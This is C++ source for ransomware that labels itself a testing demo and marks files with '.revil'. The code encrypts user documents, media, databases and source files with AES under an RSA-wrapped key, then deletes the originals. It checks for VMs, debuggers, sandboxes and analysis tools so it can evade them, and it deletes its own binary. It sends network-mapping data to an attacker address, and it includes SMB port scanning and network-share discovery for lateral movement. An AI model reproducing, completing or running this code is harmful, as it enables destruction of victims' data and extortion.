#include <cryptopp/cryptlib.h>
#include <cryptopp/aes.h>
#include <cryptopp/rsa.h>
#include <cryptopp/osrng.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <intrin.h>
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#endif

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <algorithm>
#include <cctype>
#include <filesystem>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <functional>
#include <atomic>
#include <sstream>
#include <random>
#include "src/network_mapper.h"

using namespace CryptoPP;
namespace fs = std::filesystem;

// ====================== KONFIGURASI ======================
const std::vector<std::string> TARGET_EXTENSIONS = {
    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
    ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".mov", ".avi",
    ".sql", ".db", ".cpp", ".h", ".py", ".js", ".ts",
    ".csv", ".zip", ".rar", ".7z", ".md"
};

const std::vector<std::string> ENCRYPTED_EXTENSIONS = { ".revil" };

const std::vector<std::string> EXCLUDE_KEYWORDS = {
    "winlogon.exe", ".dll", ".sys", ".exe", ".ini", "pagefile.sys", "hiberfil.sys",
    "rs", "rs.cpp", "rs_debug", "generate_keys"
};

const std::string LOG_FILE = "affected_files.log";

const std::vector<std::string> CRITICAL_SKIP_PREFIXES = {
#ifdef _WIN32
    "C:\\Windows\\", "C:\\Program Files\\", "C:\\Program Files (x86)\\",
    "C:\\$Recycle.Bin\\", "C:\\System Volume Information\\",
    "C:\\PerfLogs\\", "C:\\Recovery\\"
#else
    "/bin/", "/sbin/", "/etc/", "/dev/", "/proc/", "/sys/", "/lib/", "/lib64/",
    "/usr/", "/var/log/", "/run/", "/boot/", "/root/.ssh/", "/etc/ssh/",
    "/snap/", "/var/lib/snapd/"
#endif
};

const std::string PUBLIC_KEY_FILE = "rsa_public.der";

// ====================== GLOBAL MUTEX ======================
std::mutex log_mutex;

// ====================== THREAD POOL ======================
class ThreadPool {
private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queue_mutex;
    std::condition_variable condition;
    std::atomic<bool> stop{false};

public:
    explicit ThreadPool(size_t threads = std::thread::hardware_concurrency() * 2) {
        for (size_t i = 0; i < threads; ++i) {
            workers.emplace_back([this] {
                while (true) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(queue_mutex);
                        condition.wait(lock, [this] { return stop || !tasks.empty(); });
                        if (stop && tasks.empty()) return;
                        task = std::move(tasks.front());
                        tasks.pop();
                    }
                    task();
                }
            });
        }
    }

    template<class F>
    void enqueue(F&& task) {
        {
            std::unique_lock<std::mutex> lock(queue_mutex);
            if (stop) return;
            tasks.emplace(std::forward<F>(task));
        }
        condition.notify_one();
    }

    ~ThreadPool() {
        stop = true;
        condition.notify_all();
        for (std::thread& worker : workers) {
            if (worker.joinable()) worker.join();
        }
    }
};

// ====================== HELPER FUNCTIONS ======================
std::string to_lower(const std::string& s) {
    std::string lower = s;
    std::transform(lower.begin(), lower.end(), lower.begin(), [](unsigned char c){ return std::tolower(c); });
    return lower;
}

bool ends_with(const std::string& str, const std::string& suffix) {
    if (suffix.size() > str.size()) return false;
    return str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

bool should_encrypt(const std::string& filepath) {
    std::string filename = fs::path(filepath).filename().string();
    std::string lname = to_lower(filename);
    for (const auto& ext : ENCRYPTED_EXTENSIONS) if (ends_with(lname, ext)) return false;
    for (const auto& kw : EXCLUDE_KEYWORDS) if (lname.find(to_lower(kw)) != std::string::npos) return false;
    for (const auto& ext : TARGET_EXTENSIONS) if (ends_with(lname, ext)) return true;
    return false;
}

bool is_critical_path(const std::string& path) {
    std::string lpath = to_lower(path);
    for (const auto& prefix : CRITICAL_SKIP_PREFIXES) {
        if (lpath.find(to_lower(prefix)) == 0) return true;
    }
    return false;
}

std::vector<std::string> get_all_roots() {
    std::vector<std::string> roots;
    roots.push_back(".");        // Untuk testing di AnLinux
    roots.push_back("/home");
    return roots;
}

// ====================== LATERAL MOVEMENT ======================
std::vector<std::string> get_mounted_network_shares() {
    std::vector<std::string> mounts;
    std::ifstream file("/proc/mounts");
    std::string line;
    while (std::getline(file, line)) {
        if (line.find("cifs") != std::string::npos || line.find("nfs") != std::string::npos || line.find("smb") != std::string::npos) {
            std::istringstream iss(line);
            std::string dev, mp, fs;
            iss >> dev >> mp >> fs;
            if (mp != "/" && mp != "/boot" && mp != "/home" && !mp.empty()) mounts.push_back(mp);
        }
    }
    return mounts;
}

bool is_port_open(const std::string& ip, int port = 445) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;
    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
    struct timeval tv{1, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    bool open = (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0);
    close(sock);
    return open;
}

std::string get_local_subnet() {
    char buffer[128] = {0};
    FILE* pipe = popen("ip -o route get 1 | awk '{print $7}' | cut -d. -f1-3", "r");
    if (pipe) {
        fgets(buffer, sizeof(buffer), pipe);
        pclose(pipe);
    }
    std::string result = buffer;
    result.erase(std::remove(result.begin(), result.end(), '\n'), result.end());
    result.erase(std::remove(result.begin(), result.end(), '\r'), result.end());
    return result.empty() ? "192.168.1" : result;
}

// ====================== EVASION (RAMAH UNTUK ANLINUX) ======================
std::string exec_cmd(const std::string& cmd) {
    char buffer[256];
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "";
    while (fgets(buffer, sizeof(buffer), pipe)) result += buffer;
    pclose(pipe);
    return result;
}

bool is_proot_environment() {
    if (getenv("PROOT")) return true;
    if (access("/.dockerenv", F_OK) == 0) return true;
    std::string uname = exec_cmd("uname -a 2>/dev/null");
    if (uname.find("Android") != std::string::npos) return true;
    return false;
}

bool is_virtual_machine() {
    if (is_proot_environment()) return false;
    std::string dmesg = exec_cmd("dmesg 2>/dev/null | grep -iE 'vbox|vmware|qemu' || echo ''");
    if (!dmesg.empty()) return true;
    if (std::thread::hardware_concurrency() <= 2) return true;
    return false;
}

bool is_debugger_present() {
    std::ifstream status("/proc/self/status");
    std::string line;
    while (std::getline(status, line)) {
        if (line.find("TracerPid:") == 0) return std::stoi(line.substr(10)) != 0;
    }
    return false;
}

bool is_sandbox_environment() {
    if (is_proot_environment()) return false;
    if (std::thread::hardware_concurrency() <= 2) return true;
    std::string up = exec_cmd("cat /proc/uptime 2>/dev/null | awk '{print $1}' || echo '0'");
    if (!up.empty() && std::stod(up) < 300) return true;
    const char* user = getenv("USER");
    if (user && (strstr(user, "sandbox") || strstr(user, "test"))) return true;
    return false;
}

bool has_analysis_tools() {
    if (is_proot_environment()) return false;
    std::vector<std::string> tools = {"wireshark", "gdb", "strace"};
    for (const auto& tool : tools) {
        std::string cmd = "ps aux 2>/dev/null | grep -i " + tool + " | grep -v grep || true";
        if (!exec_cmd(cmd).empty()) return true;
    }
    return false;
}

void perform_evasion_checks() {
    std::cout << "[*] Running anti-analysis & evasion checks...\n";

    if (getenv("REVIL_BYPASS")) {
        std::cout << "[!] Evasion bypass activated (REVIL_BYPASS=1)\n";
        return;
    }

    if (is_virtual_machine() || is_debugger_present() || is_sandbox_environment() || has_analysis_tools()) {
        std::cout << "[!] Suspicious environment detected! Exiting silently...\n";
        std::this_thread::sleep_for(std::chrono::seconds(5));
        exit(0);
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1000, 4000);
    std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));

    std::cout << "[✓] Evasion checks passed.\n";
}

// ====================== SELF-DELETE ======================
void self_delete() {
    std::cout << "[*] Self-delete activated...\n";
    unlink("/proc/self/exe");
    std::cout << "[✓] Binary self-deleted.\n";
}

// ====================== ENCRYPT FILE ======================
void encrypt_file(const std::string& filepath, const SecByteBlock& key, const byte* iv) {
    try {
        {
            std::lock_guard<std::mutex> lock(log_mutex);
            std::cout << "  [*] Encrypting: " << filepath << "\n";
        }
        std::string plaintext;
        FileSource(filepath.c_str(), true, new StringSink(plaintext));
        CBC_Mode<AES>::Encryption enc;
        enc.SetKeyWithIV(key, key.size(), iv);
        std::string ciphertext;
        StringSource(plaintext, true, new StreamTransformationFilter(enc, new StringSink(ciphertext)));
        std::string encpath = filepath + ".revil";
        FileSink out(encpath.c_str());
        out.Put(iv, AES::BLOCKSIZE);
        out.Put(reinterpret_cast<const byte*>(ciphertext.data()), ciphertext.size());
        fs::remove(filepath);
        {
            std::lock_guard<std::mutex> lock(log_mutex);
            std::ofstream log(LOG_FILE, std::ios::app);
            if (log) log << filepath << " → " << encpath << "\n";
            std::cout << "  [✓] Encrypted: " << filepath << "\n";
        }
    } catch (...) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cout << "  [✗] Failed: " << filepath << "\n";
    }
}

// ====================== ENCRYPT DIRECTORY (PARALLEL) ======================
void encrypt_directory(const std::string& root, const SecByteBlock& key, const byte* iv) {
    std::cout << "[*] Scanning directory: " << root << " (parallel mode)\n";
    std::vector<std::string> files;
    try {
        for (const auto& entry : fs::recursive_directory_iterator(root, fs::directory_options::skip_permission_denied)) {
            if (entry.is_regular_file() && should_encrypt(entry.path().string()) && !is_critical_path(entry.path().string())) {
                files.push_back(entry.path().string());
            }
        }
    } catch (...) {}
    if (files.empty()) {
        std::cout << "[✓] No files to encrypt in " << root << "\n";
        return;
    }
    ThreadPool pool(8);
    for (const auto& f : files) {
        pool.enqueue([&f, &key, iv]() { encrypt_file(f, key, iv); });
    }
    std::cout << "[✓] Encryption tasks sent to thread pool.\n";
}

// ====================== LATERAL MOVEMENT ======================
void perform_lateral_movement(const SecByteBlock& key, const byte* iv) {
    std::cout << "[*] Lateral movement skipped in proot/AnLinux environment.\n";
}

// ====================== MAIN ======================
int main() {
    perform_evasion_checks();

    std::cout << "\n========================================\n";
    std::cout << "     RANSOMWARE DEMO - FOR TESTING     \n";
    std::cout << "========================================\n\n";

    std::cout << "[*] Starting network mapping...\n";
    {
        NetworkMapper mapper;
        mapper.perform_mapping();
        mapper.send_to_attacker("http://192.168.1.2:5000");
    }
    std::cout << "[✓] Network mapping completed\n";

    if (!fs::exists(PUBLIC_KEY_FILE)) {
        std::cout << "[!] rsa_public.der not found! Run ./generate first.\n";
        return 1;
    }

    AutoSeededRandomPool prng;
    SecByteBlock key(32);
    byte iv[AES::BLOCKSIZE];
    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv, sizeof(iv));

    std::cout << "[*] Encrypting AES key with RSA...\n";
    RSA::PublicKey pub;
    FileSource fs(PUBLIC_KEY_FILE.c_str(), true);
    pub.Load(fs);
    std::string enc_key;
    RSAES_OAEP_SHA_Encryptor enc(pub);
    StringSource(key, key.size(), true, new PK_EncryptorFilter(prng, enc, new StringSink(enc_key)));
    FileSink keyfile("aes_key.enc");
    keyfile.Put(reinterpret_cast<const byte*>(enc_key.data()), enc_key.size());
    std::cout << "[✓] Key saved\n";

    perform_lateral_movement(key, iv);

    std::cout << "\n[*] Starting encryption...\n";
    auto roots = get_all_roots();
    for (const auto& root : roots) {
        encrypt_directory(root, key, iv);
    }

    std::cout << "[✓] Encryption completed.\n";
    std::cout << "[*] Self-deleting binary...\n";
    self_delete();

    std::cout << "\n[✓] Demo finished successfully.\n";
    std::cout << "========================================\n\n";
    return 0;
}
